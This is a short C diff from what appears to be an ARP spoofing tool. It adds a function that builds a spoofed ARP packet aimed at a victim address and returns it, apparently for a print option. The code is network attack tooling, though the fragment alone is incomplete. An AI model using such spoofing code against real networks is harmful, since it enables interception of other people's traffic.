@@ -45,3 +45,11 @@ void spoofing_loop(params_t *params, char *victim_addr, arp_hdr_t *arp_hdr)
     free(spoofed_addr);
     close(spoofing_socket);
 }
+
+char *handle_print_spoof_flag(params_t *params, char *victim_addr, arp_hdr_t *arp_hdr)
+{
+    struct sockaddr_ll *spoofed_addr = create_spoofed_arp_socketaddr(params, victim_addr);
+    char *packet = create_spoofed_packet(arp_hdr, spoofed_addr, params, victim_addr);
+
+    return (packet);
+}
